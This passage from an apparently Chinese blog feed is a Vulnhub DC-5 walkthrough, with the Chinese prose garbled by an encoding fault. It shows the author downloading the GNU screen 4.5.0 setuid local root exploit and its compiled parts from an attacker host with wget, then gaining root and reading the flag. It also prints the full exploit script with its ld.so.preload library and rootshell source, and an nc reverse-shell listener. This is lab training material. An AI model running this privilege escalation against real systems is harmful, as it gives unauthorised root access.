-l /var/www<br>ls -l /var/www<br>total 4<br>drwxr-xr-x 4 root root 4096 Apr 20  2019 html<br>www-data@dc-5:~/html$ ls -l / | grep tmp<br>ls -l / | grep tmp<br>drwxrwxrwt   7 root root  4096 Jul 13 01:17 tmp<br>www-data@dc-5:~/html$ wget http://192.168.135.141:8888/41154.sh /tmp<br>wget http://192.168.135.141:8888/41154.sh /tmp<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-13 01:22:37--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 1192 (1.2K) [text/x-sh]<br>41154.sh: Permission denied<br><br>Cannot write to &#x27;41154.sh&#x27; (Permission denied).<br>/tmp: Scheme missing.<br>www-data@dc-5:~/html$ cd /tmp<br>cd /tmp<br>www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/41154.sh<br>wget http://192.168.135.141:8888/41154.sh<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-13 01:22:47--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 1192 (1.2K) [text/x-sh]<br>Saving to: &#x27;41154.sh&#x27;<br><br>41154.sh            100%[=====================&gt;]   1.16K  --.-KB/s   in 0s     <br><br>2022-07-13 01:22:47 (133 MB/s) - &#x27;41154.sh&#x27; saved [1192/1192]<br><br>www-data@dc-5:/tmp$ ls<br>ls<br>41154.sh<br>www-data@dc-5:/tmp$ chmod +x 41154.sh<br>chmod +x 41154.sh<br>www-data@dc-5:/tmp$ ./41154.sh<br>./41154.sh<br>bash: ./41154.sh: /bin/bash^M: bad interpreter: No such file or directory<br></code></pre></td></tr></table></figure><p>å‡ºç°äº†æŠ¥é”™ï¼Œvi æŸ¥çœ‹ï¼Œå‘ç°æ¯è¡Œç»“å°¾å‡ºç°äº†ä¸ª ^M ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash^M</span><br><span class="hljs-comment"># screenroot.sh^M</span><br><span class="hljs-comment"># setuid screen v4.5.0 local root exploit^M</span><br><span class="hljs-comment"># abuses ld.so.preload overwriting to get root.^M</span><br><span class="hljs-comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html^M</span><br><span class="hljs-comment"># HACK THE PLANET^M</span><br><span class="hljs-comment"># ~ infodox (25/1/2017) ^M</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;~ gnu/screenroot ~&quot;</span>^M<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] First, we create our shell and library...&quot;</span>^M<br></code></pre></td></tr></table></figure><p>kali ä¸Šç”¨ vi æ‰“å¼€è„šæœ¬ï¼Œæœ«è¡Œæ¨¡å¼ä¸‹è¾“å…¥ <code>set ff=unix</code> ï¼Œå†ä¿å­˜é€€å‡º</p><blockquote><p><code>set ff=unix</code> : å‘Šè¯‰ vim ç¼–è¾‘å™¨ï¼Œä½¿ç”¨unixæ¢è¡Œç¬¦</p><p>è¿™é‡Œä¹‹æ‰€ä»¥ç”¨ kali æ˜¯å› ä¸ºé¶æœºä¸Šçš„ vi ä¸çŸ¥é“æ€æ ·ä½¿ç”¨ï¼Œå¥½åƒåªèƒ½æŸ¥çœ‹ä¼¼çš„ï¼Œæ‘¸ä¸åˆ°å¤´è„‘</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> vi 41154.sh</span> <br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><blockquote><p><a href="https://blog.csdn.net/hyj_king/article/details/120301359">ã€Linuxã€‘set ff=unix éƒå°‘çš„åšå®¢-CSDNåšå®¢_ff=unix</a><br><a href="https://zhuanlan.zhihu.com/p/364037496">windowsä¸‹ç¼–å†™çš„è„šæœ¬æ–‡ä»¶ï¼Œæ”¾åˆ°Linuxä¸­æ— æ³•æ‰§è¡Œè§£å†³æ–¹æ³• - çŸ¥ä¹ (zhihu.com)</a></p></blockquote><p>é¶æœºå†æ¬¡ä¸‹è½½ï¼ŒåŠ å¯æ‰§è¡Œæƒé™ï¼Œè¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/41154.sh<br>wget http://192.168.135.141:8888/41154.sh<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-12 06:19:46--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 1152 (1.1K) [text/x-sh]<br>Saving to: &#x27;41154.sh&#x27;<br><br>41154.sh            100%[=====================&gt;]   1.12K  --.-KB/s   in 0s     <br><br>2022-07-12 06:19:46 (137 MB/s) - &#x27;41154.sh&#x27; saved [1152/1152]<br><br>www-data@dc-5:/tmp$ ls<br>ls<br>41154.sh<br>www-data@dc-5:/tmp$ chmod +x 41154.sh<br>chmod +x 41154.sh<br>www-data@dc-5:/tmp$ ./41154.sh<br>./41154.sh<br>~ gnu/screenroot ~<br>[+] First, we create our shell and library...<br>gcc: error trying to exec &#x27;cc1&#x27;: execvp: No such file or directory<br>gcc: error trying to exec &#x27;cc1&#x27;: execvp: No such file or directory<br>[+] Now we create our /etc/ld.so.preload file...<br>[+] Triggering...<br>&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>ERROR: ld.so: object &#x27;/tmp/libhax.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>No Sockets found in /tmp/screens/S-www-data.<br><br>./41154.sh: line 42: /tmp/rootshell: No such file or directory<br></code></pre></td></tr></table></figure><p>å†æ¬¡æŠ¥é”™ï¼Œå¯èƒ½é¶æœº gcc ç¼–è¯‘æ—¶å‡ºé”™äº†ï¼Œå°è¯• kali ç¼–è¯‘ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> chmod +x 41154.sh</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./41154.sh</span> <br>~ gnu/screenroot ~<br>[+] First, we create our shell and library...<br>/tmp/libhax.c: In function â€˜dropshellâ€™:<br>/tmp/libhax.c:7:5: warning: implicit declaration of function â€˜chmodâ€™ [-Wimplicit-function-declaration]<br>    7 |     chmod(&quot;/tmp/rootshell&quot;, 04755);<br>      |     ^~~~~<br>/tmp/rootshell.c: In function â€˜mainâ€™:<br>/tmp/rootshell.c:3:5: warning: implicit declaration of function â€˜setuidâ€™ [-Wimplicit-function-declaration]<br>    3 |     setuid(0);<br>      |     ^~~~~~<br>/tmp/rootshell.c:4:5: warning: implicit declaration of function â€˜setgidâ€™ [-Wimplicit-function-declaration]<br>    4 |     setgid(0);<br>      |     ^~~~~~<br>/tmp/rootshell.c:5:5: warning: implicit declaration of function â€˜seteuidâ€™ [-Wimplicit-function-declaration]<br>    5 |     seteuid(0);<br>      |     ^~~~~~~<br>/tmp/rootshell.c:6:5: warning: implicit declaration of function â€˜setegidâ€™ [-Wimplicit-function-declaration]<br>    6 |     setegid(0);<br>      |     ^~~~~~~<br>/tmp/rootshell.c:7:5: warning: implicit declaration of function â€˜execvpâ€™ [-Wimplicit-function-declaration]<br>    7 |     execvp(&quot;/bin/sh&quot;, NULL, NULL);<br>      |     ^~~~~~<br>/tmp/rootshell.c:7:5: warning: too many arguments to built-in function â€˜execvpâ€™ expecting 2 [-Wbuiltin-declaration-mismatch]<br>[+] Now we create our /etc/ld.so.preload file...<br>[+] Triggering...<br>No Sockets found in /run/screen/S-kali.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>kali<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls /tmp</span><br>libhax.so  rootshell<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> mv /tmp/libhax.so ./</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> mv /tmp/rootshell ./</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls</span>                <br>41154.sh libhax.so  rootshell<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸€ä¸‹è„šæœ¬ï¼Œå°†ä¸ç¼–è¯‘æœ‰å…³çš„ä»£ç åˆ æ‰ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># screenroot.sh</span><br><span class="hljs-comment"># setuid screen v4.5.0 local root exploit</span><br><span class="hljs-comment"># abuses ld.so.preload overwriting to get root.</span><br><span class="hljs-comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span><br><span class="hljs-comment"># HACK THE PLANET</span><br><span class="hljs-comment"># ~ infodox (25/1/2017) </span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;~ gnu/screenroot ~&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] First, we create our shell and library...&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="hljs-built_in">cd</span> /etc<br><span class="hljs-built_in">umask</span> 000 <span class="hljs-comment"># because</span><br>screen -D -m -L ld.so.preload <span class="hljs-built_in">echo</span> -ne  <span class="hljs-string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="hljs-comment"># newline needed</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Triggering...&quot;</span><br>screen -ls <span class="hljs-comment"># screen itself is setuid, so... </span><br>/tmp/rootshell<br></code></pre></td></tr></table></figure><p>é¶æœºè¿›è¡Œä¸‹è½½è¿è¡Œï¼ŒæˆåŠŸå¾—åˆ° root ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/libhax.so<br>wget http://192.168.135.141:8888/libhax.so<br>converted &#x27;http://192.168.135.141:8888/libhax.so&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/libhax.so&#x27; (UTF-8)<br>--2022-07-12 04:50:05--  http://192.168.135.141:8888/libhax.so<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 15552 (15K) [application/octet-stream]<br>Saving to: &#x27;libhax.so&#x27;<br><br>libhax.so           100%[=====================&gt;]  15.19K  --.-KB/s   in 0s     <br><br>2022-07-12 04:50:05 (69.6 MB/s) - &#x27;libhax.so&#x27; saved [15552/15552]<br><br>www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/rootshell<br>wget http://192.168.135.141:8888/rootshell<br>converted &#x27;http://192.168.135.141:8888/rootshell&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/rootshell&#x27; (UTF-8)<br>--2022-07-12 04:50:17--  http://192.168.135.141:8888/rootshell<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 16336 (16K) [application/octet-stream]<br>Saving to: &#x27;rootshell&#x27;<br><br>rootshell           100%[=====================&gt;]  15.95K  --.-KB/s   in 0s     <br><br>2022-07-12 04:50:17 (109 MB/s) - &#x27;rootshell&#x27; saved [16336/16336]<br><br>www-data@dc-5:/tmp$ wget http://192.168.135.141:8888/41154.sh<br>wget http://192.168.135.141:8888/41154.sh<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-12 04:50:29--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 566 [text/x-sh]<br>Saving to: &#x27;41154.sh&#x27;<br><br>41154.sh            100%[=====================&gt;]     566  --.-KB/s   in 0s     <br><br>2022-07-12 04:50:29 (174 MB/s) - &#x27;41154.sh&#x27; saved [566/566]<br><br>www-data@dc-5:/tmp$ chmod +x libhax.so<br>chmod +x libhax.so<br>www-data@dc-5:/tmp$ chmod +x rootshell<br>chmod +x rootshell<br>www-data@dc-5:/tmp$ chmod +x 41154.sh<br>chmod +x 41154.sh<br>www-data@dc-5:/tmp$ ./41154.sh<br>./41154.sh<br>~ gnu/screenroot ~<br>[+] First, we create our shell and library...<br>[+] Now we create our /etc/ld.so.preload file...<br>[+] Triggering...<br>&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>[+] done!<br>No Sockets found in /tmp/screens/S-www-data.<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>whoami<br>root<br><span class="hljs-meta">#</span><span class="bash"> ls /root</span><br>ls /root<br>thisistheflag.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /root/thisistheflag.txt</span><br>cat /root/thisistheflag.txt<br><br><br>888b    888 d8b                                                      888      888 888 888 <br>8888b   888 Y8P                                                      888      888 888 888 <br>88888b  888                                                          888      888 888 888 <br>888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 <br>888 Y88b888 888 d88P&quot;   d8P  Y8b      888  888  888 d88&quot;&quot;88b 888P&quot;   888 .88P 888 888 888 <br>888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P <br>888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 &quot;88b  &quot;   &quot;   &quot;  <br>888    Y888 888  &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot;  888     888  888 888 888 888 <br>                                                                                          <br>                                                                                          <br><br><br>Once again, a big thanks to all those who do these little challenges,<br>and especially all those who give me feedback - again, it&#x27;s all greatly<br>appreciated.  :-)<br><br>I also want to send a big thanks to all those who find the vulnerabilities<br>and create the exploits that make these challenges possible.<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><ol><li>æ–‡ä»¶åŒ…å«æ¼æ´</li><li>å°†åå¼¹ shell å†™å…¥æ—¥å¿—æ–‡ä»¶ï¼Œå®ç°åå¼¹</li><li>screen ææƒï¼ˆSUID ææƒï¼‰ï¼šå‡½æ•°åŠ«æŒ</li></ol><h2 id="äº”ã€Others"><a href="#äº”ã€Others" class="headerlink" title="äº”ã€Others"></a>äº”ã€Others</h2><p>ç›´æ¥è¿è¡Œ screen-4.5.0 ï¼š</p><blockquote><p><a href="https://blog.csdn.net/weixin_43376075/article/details/124424541">(Must be connected to a terminalè§£å†³æ–¹æ³•_ç¾è±†é˜¿çš„åšå®¢-CSDNåšå®¢</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>                                <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.160] 38556<br>/bin/screen-4.5.0<br>Must be connected to a terminal.<br><br>script /dev/null<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> /bin/screen-4.5.0</span><br>/bin/screen-4.5.0<br>Please set a terminal type.<br><span class="hljs-meta">$</span><span class="bash"> script /dev/null</span><br>script /dev/null<br>Script started, file is /dev/null<br><span class="hljs-meta">$</span><span class="bash"> /bin/screen-4.5.0</span><br>/bin/screen-4.5.0<br>Please set a terminal type.<br></code></pre></td></tr></table></figure><p>è§£å†³æ— æ³•è¿è¡Œçš„é—®é¢˜ï¼Œä½†è°ƒç”¨çš„æƒé™å¹¶ä¸æ˜¯ rootï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>                                <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.160] 38556<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-5:~/html$ /bin/screen-4.5.0<br>/bin/screen-4.5.0<br>Please set a terminal type.<br><br>www-data@dc-5:~/html$ export -p         <br>export -p<br>declare -x HOME=&quot;/var/www&quot;<br>declare -x OLDPWD<br>declare -x PWD=&quot;/var/www/html&quot;<br>declare -x SHLVL=&quot;1&quot;<br>declare -x USER=&quot;www-data&quot;<br>www-data@dc-5:~/html$ export TERM=&quot;xterm-256color&quot;<br>export TERM=&quot;xterm-256color&quot;<br>www-data@dc-5:~/html$ export -p<br>export -p<br>declare -x HOME=&quot;/var/www&quot;<br>declare -x OLDPWD<br>declare -x PWD=&quot;/var/www/html&quot;<br>declare -x SHLVL=&quot;1&quot;<br>declare -x TERM=&quot;xterm-256color&quot;<br>declare -x USER=&quot;www-data&quot;<br>www-data@dc-5:~/html$ echo $TERM<br>echo $TERM<br>xterm-256color<br><br>www-data@dc-5:~/html$ screen -s /bin/sh<br>screen -s /bin/sh<br>[screen is terminating]<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br><span class="hljs-meta">$</span><span class="bash"> ps -aux | grep screen</span><br>ps -aux | grep screen<br>www-data  1532  0.0  0.2  21832  2252 pts/1    S+   02:23   0:00 screen -s /bin/sh<br>www-data  1543  0.0  0.0  11128   960 pts/2    S+   02:27   0:00 grep screen<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br><br>www-data@dc-5:~/html$ ls -l /bin/screen-4.5.0<br>ls -l /bin/screen-4.5.0<br>-rwsr-xr-x 1 root root 1441352 Apr 19  2019 /bin/screen-4.5.0<br></code></pre></td></tr></table></figure><p>å®Œæ•´çš„åˆ©ç”¨è„šæœ¬ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># screenroot.sh</span><br><span class="hljs-comment"># setuid screen v4.5.0 local root exploit</span><br><span class="hljs-comment"># abuses ld.so.preload overwriting to get root.</span><br><span class="hljs-comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span><br><span class="hljs-comment"># HACK THE PLANET</span><br><span class="hljs-comment"># ~ infodox (25/1/2017) </span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;~ gnu/screenroot ~&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] First, we create our shell and library...&quot;</span><br>cat &lt;&lt; <span class="hljs-string">EOF &gt; /tmp/libhax.c</span><br><span class="hljs-string">#include &lt;stdio.h&gt;</span><br><span class="hljs-string">#include &lt;sys/types.h&gt;</span><br><span class="hljs-string">#include &lt;unistd.h&gt;</span><br><span class="hljs-string">__attribute__ ((__constructor__))</span><br><span class="hljs-string">void dropshell(void)&#123;</span><br><span class="hljs-string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="hljs-string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="hljs-string">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="hljs-string">    printf(&quot;[+] done!\n&quot;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c<br>rm -f /tmp/libhax.c<br>cat &lt;&lt; <span class="hljs-string">EOF &gt; /tmp/rootshell.c</span><br><span class="hljs-string">#include &lt;stdio.h&gt;</span><br><span class="hljs-string">int main(void)&#123;</span><br><span class="hljs-string">    setuid(0);</span><br><span class="hljs-string">    setgid(0);</span><br><span class="hljs-string">    seteuid(0);</span><br><span class="hljs-string">    setegid(0);</span><br><span class="hljs-string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>gcc -o /tmp/rootshell /tmp/rootshell.c<br>rm -f /tmp/rootshell.c<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="hljs-built_in">cd</span> /etc<br><span class="hljs-built_in">umask</span> 000 <span class="hljs-comment"># because</span><br>screen -D -m -L ld.so.preload <span class="hljs-built_in">echo</span> -ne  <span class="hljs-string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="hljs-comment"># newline needed</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Triggering...&quot;</span><br>screen -ls <span class="hljs-comment"># screen itself is setuid, so... </span><br>/tmp/rootshell<br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://man.linuxde.net/screen">screenå‘½ä»¤_Linux screen å‘½ä»¤ç”¨æ³•è¯¦è§£ï¼šç”¨äºå‘½ä»¤è¡Œç»ˆç«¯åˆ‡æ¢ (linuxde.net)</a></p><p><a href="https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html">[screen-devel] [bug #50142] root exploit 4.5.0 (gnu.org)</a></p><p><a href="https://www.cnblogs.com/sench/p/8933638.html">linuxå‘½ä»¤â€”umask - ColdCode - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://cloud.tencent.com/developer/article/1683272">LD_PRELOAD åé—¨ | Linux åé—¨ç³»åˆ— - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p><p><a href="https://blog.csdn.net/whatday/article/details/108890018">linux LD_PRELOAD é¢„åŠ è½½ so ç®€ä»‹ whatdayçš„åšå®¢-CSDNåšå®¢_ld_preload</a></p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DCï¼š6</title>
    <link href="/2022/07/11/Penetration/Vulnhub/Part-1/0x09%20DC-6/"/>
    <url>/2022/07/11/Penetration/Vulnhub/Part-1/0x09%20DC-6/</url>
    
